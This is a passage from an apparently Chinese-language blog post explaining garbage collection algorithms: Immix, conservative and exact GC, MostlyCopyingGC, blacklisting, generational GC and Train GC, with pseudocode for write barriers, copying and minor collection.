href="#GC过程" class="headerlink" title="GC过程"></a>GC过程</h6><p><strong>步骤 1—选定备用From块</strong></p><p>资料上面给的过程比较详细，需要很长时间才能理解操作的本质以及这样做的意义。经过本人的理解，将其精炼为我自己的看法。</p><p>首先统计以hole_cnt维度的FREE线以及非FREE线的总数，得到类似于下面的表。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922185839306.png" alt="image-20210922185839306"></p><p>这里的require 是备用 From 块里非 FREE 线的总数，available 是除了备用 From 块以外的块所持有的 FREE 线的总数。简单来说就是评价孔数维度chunk是否释放的权重。（这里并非单个chunk最大孔数就为6孔了，而是为了举例理解该算法的思想。）</p><p>因为status 为FREE的块里面全部为FREE线，所以假设这张表有两个FREE块，此时这两个FREE块的FREE线则为256 * 2 == 512个。</p><p>此时available == 512 + 10 + 29 + 49 + 41 + 36 + 40 == 717 。我们判断require 与available 权重的方式就是直观的比大小。接下来计算出require &gt; available 孔的数量。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190520258.png" alt="image-20210922190520258"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190528333.png" alt="image-20210922190528333"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922190539045.png" alt="image-20210922190539045"></p><p>经过上面的图发现当hole_cnt为4的时候，require &gt; available 。所以当hole_cnt &gt; 4的所有chunk将被设置为备用FREE空间，交由GC复制算法来处理。</p><p><strong>步骤2—搜索阶段</strong></p><p>搜索阶段要从根开始搜索对象，根据对象分别进行标记处理或复制处理。这里的复制处理指的是将备用 From 块里的对象复制到别的块（To 块），并进行压缩。</p><p>在搜索阶段中，如果搜索到的对象在备用 From 块里，那么就会进行复制操作，如果在别的块里，就会执行标记操作。</p><p><strong>步骤3—清除阶段</strong></p><p>清除阶段判断mark_table[i] 的值，如果是FREE 或 ALLOCATED，则 line[i] 里就有两种情况 —没有对象或只有垃圾，因此这个线就能被回收再利用了。</p><p> 当mark_table[i] 的值为 CONSERVATIVE 时，可能line[i-1] 里的对象有可能也占据了 line[i] 的空间 。如果 line[i-1] 的对象都是非活动对象，就可以将 line[i] 进行回收再利用。但是即使line[i-1] 只有一个活动对象，这个对象也有可能占据 line[i] 的空间，所以这时就不能将line[i] 进行回收再利用了。</p><p>【优点】利用线这个结构进行管理，线比块的范围小但比对象的范围大。（兼顾了效率与处理难度）</p><p>【优点】由于备用From空间的存在，碎片化严重的块可以通过GC复制算法将活动对象进行压缩。</p><p>【缺点】对象不是按顺序保存的，不能很好的利用缓存。</p><p>【缺点】由于我们曾经做过保守的标记，有些没有活动对象的线有可能无法被回收。致使堆使用效率降低。</p><p>总体来说，该算法仍然是一种比较优秀的算法。</p><h3 id="保守式GC（Conservative-GC）"><a href="#保守式GC（Conservative-GC）" class="headerlink" title="保守式GC（Conservative GC）"></a>保守式GC（Conservative GC）</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h4><p>GC有两个种类，分别为“保守式 GC”和“准确式 GC”。保守式 GC指的是“不能识别指针和非指针的 GC”（因为存在不明确的根（寄存器、调用栈、全局变量空间），里面存放的可能是指针也可能是数据）。</p><p>存在貌似指针的非指针：当基于不明确的根运行 GC 时，偶尔会出现非指针和堆里的对象的地址一样的情况，这时 GC 就无法识别出这个值是非指针。如下图，这种情况很危险。在GC的时候即使这个对象真的用不到了也不会被回收，因为被错误识别成指针的数据指向了这个对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923095214383.png" alt="image-20210923095214383"></p><p>不明确的数据结构：类似下面的联合体，GC不能识别出这块空间是指针还是数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line"> <span class="keyword">long</span> n;</span><br><span class="line"> <span class="keyword">void</span> *ptr;</span><br><span class="line">&#125; ambiguous_data;</span><br></pre></td></tr></table></figure><h4 id="评估-4"><a href="#评估-4" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h5><ol><li><code>实现容易</code>：编写程序设计语言的处理程序（编译器，解释器）可以花比较少的时间在GC上。</li></ol><h5 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>识别指针和非指针需要付出成本</code>：需要消耗计算机资源来识别不明确的根和数据结构的值为“指针”还是“非指针”。</li><li><code>错误识别指针会压迫堆</code>：当识别错误时会降低堆空间利用率，不断挤压蚕食堆空间。</li><li><code>GC算法的选择有限制</code>：基本上不能使用 GC 复制算法等移动对象的 GC 算法。因为如果将对象移动到新空间，被错误识别成指针的数据也会被修改为新的值（此时该值为新对象的地址）。</li></ol><p>总之缺点大于优点，建议使用准确式GC来作为GC模式。</p><h4 id="准确式GC"><a href="#准确式GC" class="headerlink" title="准确式GC"></a>准确式GC</h4><p>准确式 GC（Exact GC）和保守式 GC 正好相反，它是能正确识别指针和非指针的 GC。创建正确的根的方法有很多种，不过这些方法有个共通点，就是需要“语言处理程序的支援”，所以正确的根的创建方法是依赖于语言处理程序的实现的。下面是几种比较常用的方法。</p><ol><li><p><code>打标签</code>：一个例子是在低一位打标签。v8就是这么干的。做法是把非指针（int等）向左移动 1 位（a &lt;&lt; 1），将低 1 位置位（指针设置为1，数据不用动）。移位要注意不要让数据溢出。处理数据时先将其右移移位进行运算，等到操作完成该数据后再将其左移回去。基本上打标签和取消标签的操作都是由语言处理程序执行的。</p></li><li><p><code>不把寄存器和栈等当作根</code>：前提条件是创建一个正确的根，这个正确的根在处理程序里只集合了 mutator可能到达的指针，然后以它为基础来执行 GC。Example，当语言处理程序采用 VM（虚拟机）这种构造时，有时会将 VM 里的调用栈和寄存器当作正确的根来使用。</p></li></ol><p>【优点】保守式GC的缺点在这里都得到了解决。</p><p>【缺点】同样保守式的优点也是它的缺点，也就是实现困难。</p><p>【缺点】打标签的方式可能会影响程序整体的运行速度。</p><h4 id="优化措施-4"><a href="#优化措施-4" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h5><p>解决的是<code>GC算法的选择有限制</code>的问题，使用该技术就可以使用GC复制算法了。间接引用实际上就是加了一个中间层。由于加了一个中间层，当对象移动时，中间层的值进行了修改，而根始终指向中间层，根的值并没有做任何更改。</p><p>【优点】可以使用类似于GC复制算法等移动对象的算法了，可选择性多了。</p><p>【缺点】因为必须将所有对象都（经由句柄）间接引用，所以会拉低访问对象内数据的速度，这会关系到整个语言处理程序的速度。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923103949964.png" alt="image-20210923103949964"></p><h5 id="MostlyCopyingGC"><a href="#MostlyCopyingGC" class="headerlink" title="MostlyCopyingGC"></a>MostlyCopyingGC</h5><h6 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h6><p>这是1989 年 诞生的一个保守式 GC 复制算法。这个算法能在不明确的根的环境中运行 GC 复制算法。堆被分成若干个一定大小的页。页有三种形式。如下图：</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104729380.png" alt="image-20210923104729380"></p><p>OBJECT表示正在使用的页，CONTINUED表示当正在使用的页跨页时将被设置在第2个页之后，没有标志的表示空白页。</p><p>默认一个新的堆中全部是空白页，申请小对象基本只会分配在已有的OBJECT页或者新建的OBJECT页；而申请大对象基本会新建OBJECT页和CONTINUED页。</p><h6 id="分配过程-1"><a href="#分配过程-1" class="headerlink" title="分配过程"></a>分配过程</h6><p>如果正在使用的页里有符合 mutator 申请的对象大小的chunk，对象就会被分配到这个页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104644245.png" alt="image-20210923104644245"></p><p>如果当正在使用的页里没有大小充足的chunk时，对象就会被分配到空的页，然后正在使用的这个新页会被设置 OBJECT 标志。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104701966.png" alt="image-20210923104701966"></p><p>当 mutator 要求大对象时，分配程序会将对象跨多个页来分配。在跨多个页分配时，和平时的分配一样，也会在开头的页设定OBJECT，然后在第 2 个页之后设置 CONTINUED 标志。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923104729380.png" alt="image-20210923104729380"></p><h6 id="GC过程-1"><a href="#GC过程-1" class="headerlink" title="GC过程"></a>GC过程</h6><p>初始状态，这里的$current_space是From页的编号，$next_space是To页的编号，此时二者相同。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111112352.png" alt="image-20210923111112352"></p><p>将从根引用的对象的页“晋升”（promotion）到 To 页，此时$next_space发生了改变，目的是为了区分标记From页和To页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111140560.png" alt="image-20210923111140560"></p><p>接着还是按照由根到堆的顺序将From页的活动对象复制到To页。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111419480.png" alt="image-20210923111419480"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111507354.png" alt="image-20210923111507354"></p><p>将 To 页里的所有子对象复制完毕后，GC 就结束了。这时程序会将 $current_space 的值设定为 $next_space 的值。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210923111537022.png" alt="image-20210923111537022"></p><p>不过此时垃圾对象 X、Y、D 都没有被回收（因为Y不能被任何指针索引到，而D由Y索引，所以二者都是垃圾对象）。实际上这就是 MostlyCopyingGC的特殊之处。它不会回收包含有从根指向的对象（图中的 A）的页里的垃圾对象，而且也不会回收这个垃圾对象所引用的对象群。举个极端的例子，如果所有的页里都有从根引用的对象，那么所有的垃圾都不能被回收。</p><p>这个缺点可以通过调整页大小得到改善。如果缩小页，那么即使页里的对象是从根引用的，我们也能把损失降到最低。不过如果页太小了，就会增加页总数，增大分配和 GC 所需要的成本。所以将页调整到合适大小是非常关键的。据文献 [17] 记载，有试验结果表明页的合适大小在 512 字节。</p><p>【优点】能在保守式 GC 里使用 GC 复制算法。兼顾了保守式GC（实现简单）和GC复制算法的优点。</p><p>【缺点】也同样由GC复制算法的缺点，还有一个特有缺点是在包含有从根引用的对象的页内，所有的对象都会被看成活动对象。也就是说，垃圾对象也会被看成活动对象，这样一来就拉低了内存的使用效率。</p><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><p>处理的是<code>错误识别指针会压迫堆</code>的问题，通过黑名单标记可能存在问题的内存，减小其带来的危害（但不能消除）。</p><p>在指针的错误识别中，当被错误判断为活动对象的那些垃圾对象的大小过大以及子对象过多时，造成的危害会相对来说比较大。而当其垃圾对象的大小比较小而且该对象没有子对象时，造成的危害会比较小。</p><p>基于这一点，黑名单就是一种创建“需要注意的地址的名单”的方法。这个黑名单里记录的是“不明确的根内的非指针，其指向的是有可能被分配对象的地址”。我们将这项记录操作称为“记入黑名单”。黑名单里记录的是“需要注意的地址”。一旦分配程序把对象分配到这些需要注意的地址中，这个对象就很可能被非指针值所引用。也就是说，即使分配后对象成了垃圾，也很有可能被错误识别成“它还活着”。所以我们在黑名单中的内存可以分配上述提到的大小比较小且没有子对象的对象，这样为如果这样的对象成了垃圾，即使被错误识别了，也不会有什么大的损失。说白了就是风险最小化。</p><p>【优点】可以缓解<code>错误识别指针会压迫堆</code>的问题。堆的使用效率页得到了提升。</p><p>【缺点】分配对象时需要检查黑名单，需要花费一定的时间。</p><p>无法判断该技术是否好用，具体是否应用该技术取决于工程实际测试时表现的性能。</p><h3 id="分代垃圾回收（Generational-GC）"><a href="#分代垃圾回收（Generational-GC）" class="headerlink" title="分代垃圾回收（Generational GC）"></a>分代垃圾回收（Generational GC）</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h4><p>分代垃圾回收中把对象分类成几代，针对不同的代使用不同的 GC 算法，我们把刚生成的对象称为新生代对象，到达一定年龄的对象则称为老年代对象。我们将对新对象执行的 GC 称为新生代 GC（minor GC）。将面向老年代对象的 GC 称为老年代 GC（major GC）。</p><p>分代垃圾回收，基于的是“<strong>大部分的对象，在生成后马上就会变成垃圾</strong>”这一经验上的事实为设计出发点。</p><h4 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h4><p>这里介绍下<strong>Ungar</strong>的分代垃圾回收，它是由 David Ungar 研究出来的把 GC 复制算法和分代垃圾回收这两者组合运用的方法。</p><p>堆结构如下。两个幸存空间可以分成From幸存空间和To幸存空间，生成空间和From幸存空间都会使用类似于GC复制算法将活动对象拷贝到To空间，之后进行From幸存空间和To幸存空间的swap。可能会出现To幸存空间可能不能承载所有活动对象的任务（这种情况可能比较少，因为新生代对象的定义就是生命比较短的对象），这时就会临时将老年代空间当作承载容器。只有达到一定年龄的对象才会被移动到老年代空间中。老年代空间满了之后会执行GC标记-清除算法。这时可能会出现老年代对象指向新生代对象的情况。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924141654564.png" alt="image-20210924141654564"></p><p>对于新生代对象的索引有三种情况：根索引、新生代对象索引、老年代对象索引。分代垃圾回收的优点是只将垃圾回收的重点放在新生代对象身上，以此来缩减 GC 所需要的时间。不过考虑到从老年代对象的引用，结果还是要搜索老年代堆中的所有对象，这样一来就大大削减了分代垃圾回收的优势。这时我们可以维护一个列表来维护从老年代指向新生代的对象，这个列表就叫做记录集。写入记录集之前会判断该对象是否在老年代且指向的对象是否在新生代，该对象是否没有保存在记录集中（通过标志位remembered来判断），如果都满足条件则将该对象的索引写入记录集中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write_barrier：写入记录集。</span></span><br><span class="line"><span class="built_in">write_barrier</span>(obj, field, new_obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj &gt;= $old_start &amp;&amp; new_obj &lt; $old_start &amp;&amp; obj.remembered == FALSE)</span><br><span class="line"> $rs[$rs_index] = obj</span><br><span class="line"> $rs_index++</span><br><span class="line"> obj.remembered = TRUE</span><br><span class="line">     </span><br><span class="line"> *field = new_obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>对象头</code>包含了很多东西，有常规的对象的种类和大小，还有</p><ul><li>对象的年龄（age）：只在新生代对象头，如果年龄到达阈值则进入老年代。</li><li>对象是否已经被复制过（forwarded）：只在新生代对象头，防止复制相同对象。</li><li>是否被记录集记录（remembered）：只再老年代对象头，防止重复再记录集记录。</li></ul><p>对象还有个forwarding指针，obj.forwarding，指向了要复制的空间。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：主要逻辑就是复制内存，移动指针。和GC复制算法很像。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($new_free + size &gt;= $survivor1_start)</span><br><span class="line"> <span class="built_in">minor_gc</span>()</span><br><span class="line"> <span class="keyword">if</span>($new_free + size &gt;= $survivor1_start)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj = $new_free</span><br><span class="line"> $new_free += size</span><br><span class="line"> obj.age = <span class="number">0</span></span><br><span class="line"> obj.forwarded = FALSE</span><br><span class="line"> obj.remembered = FALSE</span><br><span class="line"> obj.size = size</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：根据对象的年龄来决定将对象复制到新生代空间还是老年代空间。</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.forwarded == FALSE)</span><br><span class="line"> <span class="keyword">if</span>(obj.age &lt; AGE_MAX)</span><br><span class="line"> <span class="built_in">copy_data</span>($to_survivor_free, obj, obj.size)</span><br><span class="line"> obj.forwarded = TRUE</span><br><span class="line"> obj.forwarding = $to_survivor_free</span><br><span class="line"> $to_survivor_free.age++</span><br><span class="line"> $to_survivor_free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">promote</span>(obj)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// promote：年龄到达指定大小即可今生至老年代，之后判断该对象指向的对象是否在新生代，若是则将其地址存放在记录集中。</span></span><br><span class="line"><span class="built_in">promote</span>(obj)&#123;</span><br><span class="line"> new_obj = <span class="built_in">allocate_in_old</span>(obj)</span><br><span class="line"> <span class="keyword">if</span>(new_obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">major_gc</span>()</span><br><span class="line"> new_obj = <span class="built_in">allocate_in_old</span>(obj)</span><br><span class="line"> <span class="keyword">if</span>(new_obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj.forwarding = new_obj</span><br><span class="line"> obj.forwarded = TRUE</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(new_obj))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> $rs[$rs_index] = new_obj</span><br><span class="line"> $rs_index++</span><br><span class="line"> new_obj.remembered = TRUE</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// minor_gc：新生代GC，上半部分通过根遍历所有新生代对象进行复制，下半部分遍历记录集来复制来自老年代指针指向的新生代对象。</span></span><br><span class="line"><span class="built_in">minor_gc</span>()&#123;</span><br><span class="line"> $to_survivor_free = $to_survivor_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &lt; $old_start)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line">     </span><br><span class="line"> i = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(i &lt; $rs_index)</span><br><span class="line"> has_new_obj = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>($rs[i]))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> has_new_obj = TRUE</span><br><span class="line"> <span class="keyword">if</span>(has_new_obj == FALSE)</span><br><span class="line"> $rs[i].remembered = FALSE</span><br><span class="line"> $rs_index--</span><br><span class="line"> <span class="built_in">swap</span>($rs[i], $rs[$rs_index])</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> i++</span><br><span class="line">     </span><br><span class="line"> <span class="built_in">swap</span>($from_survivor_start, $to_survivor_start)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="评估-5"><a href="#评估-5" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h5><ol><li><code>提高了吞吐量</code>：基于“很多对象年纪轻轻就会死”的理论。通过分代的方式快速处理了大部分对象，而难以变为垃圾的老年代对象也没有必要频繁的进行GC访问。</li></ol><h5 id="缺点-5"><a href="#缺点-5" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>可能起反作用</code>：虽然“很多对象年纪轻轻就会死”毕竟只适合大部分那情况，并不适用于所有程序。当那少部分的程序使用分代的方式处理时不仅新生代GC花费的时间会增多，老年代的GC也会频繁运行，写入记录集的操作也会降低吞吐量。</li><li><code>最大暂停时间问题</code>：老年代使用了GC标记-清除算法，对于最大暂停时间有影响。</li><li><code>跨代的循环引用无法一次性回收</code>：只有等新生代的对象年龄到了放在老年代才能得到处理。</li><li><code>记录集比较占用空间</code>：每有一个老年代指向新生代的对象，就会占用一个字存放在记录集中。</li></ol><h4 id="优化措施-5"><a href="#优化措施-5" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="记录各代之间的引用的方法"><a href="#记录各代之间的引用的方法" class="headerlink" title="记录各代之间的引用的方法"></a>记录各代之间的引用的方法</h5><p>解决的是<code>记录集比较占用空间</code>的问题，可以通过两种方式。</p><p>一是将老年代内存分为一节节的小内存，每节小内存如果有对象指向新生代空间，那么该节的标志位置为1 。但是当老年代对象比较多的时候，搜索每节内存都要花费大量时间。</p><p>二是通过操作系统的页面管理程序，很多操作系统都是以页面为单位来管理内存空间的。因此如果在卡片标记中将卡片和页面设置为同样大小，我们就能得到 OS 的帮助。实际上利用的也是第一点提到的思路，只不过有操作系统协助管理。但是这个方法只适用于能利用页面重写标志位或能利用内存保护功能的环境。而且不只搜索老年代到新生代会进行索引，老年代对老年代进行索引操作系统也会进行标记。</p><h5 id="多代垃圾回收"><a href="#多代垃圾回收" class="headerlink" title="多代垃圾回收"></a>多代垃圾回收</h5><p>它是为了解决<code>最大暂停时间问题</code>。分代垃圾回收将对象分为新生代和老年代，通过尽量减少从新生代晋升到老年代的对象，来减少在老年代对象上消耗的垃圾回收的时间。</p><p>但是如果代数太多，各代之间的引用就会变得更复杂，每代的空间也就越小，各代GC花费的时间也越长了。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924171957812.png" alt="image-20210924171957812"></p><h5 id="Train-GC"><a href="#Train-GC" class="headerlink" title="Train GC"></a>Train GC</h5><p>该方法是为了解决<code>跨代的循环引用无法一次性回收</code>和<code>最大暂停时间问题</code>。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930104000476.png" alt="image-20210930104000476"></p><p>Train GC的特点有</p><ol><li>引入了“列车”与“车厢”的概念，GC的对象是第一个列车的第一个车厢。</li><li>新生代对象不在分为生成空间、2 个大小相等的幸存空间这三块空间了，而是仅仅只有一块新生代空间，毕竟To空间放在老年代空间里面了。</li><li>记录集有多个，并且是单向的（因为GC的对象仅仅在第一个列车里面）。新生代、列车、车厢都有记录集。</li></ol><p><code>新生代GC</code>将被引用的新生代对象复制到引用它的老年代对象的车厢中，并把根引用的新生代对象放入新的车厢中</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210930111249965.png" alt="image-20210930111249965"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy：将新生代对象复制到老年代的车厢中。</span></span><br><span class="line"><span class="built_in">copy</span>(obj, to_car)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.forwarded == FALSE)</span><br><span class="line">     <span class="keyword">if</span>(to_car.free + obj.size &gt;= to_car.start + CAR_SIZE)</span><br><span class="line">     to_car = <span class="built_in">new_car</span>(to_car)</span><br><span class="line">     <span class="built_in">copy_data</span>(to_car.free, obj, obj.size)</span><br><span class="line">     obj.forwarding = to_car.free</span><br><span class="line">     obj.forwarded = TRUE</span><br><span class="line">     to_car.free += obj.size</span><br><span class="line">     <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line">     *child = <span class="built_in">copy</span>(*child, to_car)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// minor_gc：将具有引用关系的对象被安排到了同一辆列车里，如果空间不够则安排到新车厢中。</span></span><br><span class="line"><span class="built_in">minor_gc</span>()&#123;</span><br><span class="line"> to_car = <span class="built_in">new_car</span>(<span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &lt; $old_start)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r, to_car)</span><br><span class="line">     </span><br><span class="line"> <span class="keyword">for</span>(remembered_obj : $young_rs)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(*remembered_obj))</span><br><span class="line"> <span class="keyword">if</span>(*child &lt; $old_start)</span><br><span class="line"> to_car = <span class="built_in">get_last_car</span>(<span class="built_in">obj_to_car</span>(*remembered_obj))<span class="comment">// 该行将具有引用关系的对象被安排到了同一辆列车里。这方便在老年代GC的时候回收整个车厢。</span></span><br><span class="line"> *child = <span class="built_in">copy</span>(*child, to_car)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而正常的老年代GC流程则是按照搜索第一个列车-&gt;第一节车厢的顺序清空第一个车厢的活动对象并进行垃圾回收。先把列车一被其他列车引用的对象复制到其他列车中，如图7.14。之后再将1.1车厢被列车一其他车厢引用的对象复制出去，这样车厢一的活动对象就已经被清空了。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210924181640772.png" 